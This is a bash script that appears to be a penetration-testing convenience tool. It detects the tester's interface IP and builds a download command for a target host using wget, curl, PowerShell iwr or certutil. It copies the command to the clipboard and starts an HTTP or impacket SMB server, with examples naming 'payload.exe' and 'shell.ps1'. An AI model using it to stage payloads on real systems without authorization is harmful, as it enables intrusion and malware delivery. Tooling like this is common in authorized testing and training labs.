#!/bin/bash

# Usage function
usage() {
    echo "Usage: $0 [-w] [-t <tool>] [-s <server>] <interface> <filename>"
    echo
    echo "Options:"
    echo "  -w            Add -O <filename> (wget style) or -o <filename> (curl style)"
    echo "  -t <tool>     Download tool: wget | curl | iwr | certutil (default: wget)"
    echo "  -s <server>   Server type: http | smb (default: http)"
    echo
    echo "Example:"
    echo "  $0 eth0 payload.exe"
    echo "  $0 -t curl -s smb tun0 shell.ps1"
    exit 1
}

SAVE_FILE=false
TOOL="wget"   # default
SERVER="http" # default
INTERFACE=""
FILENAME=""

# Parse arguments in any order
while [[ $# -gt 0 ]]; do
    case "$1" in
        -w)
            SAVE_FILE=true
            ;;
        -t)
            TOOL="$2"
            shift
            ;;
        -s)
            SERVER="$2"
            shift
            ;;
        -*)
            echo "Unknown option: $1"
            usage
            ;;
        *)
            # Positional args (interface, filename)
            if [ -z "$INTERFACE" ]; then
                INTERFACE="$1"
            elif [ -z "$FILENAME" ]; then
                FILENAME="$1"
            else
                echo "Too many arguments!"
                usage
            fi
            ;;
    esac
    shift
done

# Validate required args
if [ -z "$INTERFACE" ] || [ -z "$FILENAME" ]; then
    usage
fi

# Get IP address
IP_ADDR=$(ip -4 addr show "$INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
if [ -z "$IP_ADDR" ]; then
    echo "Could not find IP address for interface $INTERFACE"
    exit 1
fi

# Construct command depending on tool
case "$TOOL" in
    wget)
        if [ "$SAVE_FILE" = true ]; then
            CMD="wget http://$IP_ADDR:8000/$FILENAME -O $FILENAME"
        else
            CMD="wget http://$IP_ADDR:8000/$FILENAME"
        fi
        ;;
    curl)
        if [ "$SAVE_FILE" = true ]; then
            CMD="curl http://$IP_ADDR:8000/$FILENAME -o $FILENAME"
        else
            CMD="curl -O http://$IP_ADDR:8000/$FILENAME"
        fi
        ;;
    iwr)
        CMD="iwr http://$IP_ADDR:8000/$FILENAME -OutFile $FILENAME"
        ;;
    certutil)
        CMD="certutil -urlcache -split -f http://$IP_ADDR:8000/$FILENAME $FILENAME"
        ;;
    *)
        echo "Invalid tool. Must be one of: wget | curl | iwr | certutil"
        exit 1
        ;;
esac

# Show command
echo "$CMD"

# Auto-copy ONLY the command
if command -v xclip >/dev/null 2>&1; then
    echo -n "$CMD" | xclip -selection clipboard
    echo "[+] Command copied to clipboard (xclip)"
elif command -v xsel >/dev/null 2>&1; then
    echo -n "$CMD" | xsel --clipboard --input
    echo "[+] Command copied to clipboard (xsel)"
elif command -v pbcopy >/dev/null 2>&1; then
    echo -n "$CMD" | pbcopy
    echo "[+] Command copied to clipboard (pbcopy)"
elif command -v clip.exe >/dev/null 2>&1; then
    echo -n "$CMD" | clip.exe
    echo "[+] Command copied to clipboard (Windows/WSL)"
else
    echo "[!] Clipboard tool not found — command NOT copied."
fi

# Start server
echo "[*] Starting $SERVER server..."
if [ "$SERVER" = "http" ]; then
    python -m http.server 8000
elif [ "$SERVER" = "smb" ]; then
    sudo impacket-smbserver share . -smb2support
else
    echo "Invalid server type. Use: http | smb"
    exit 1
fi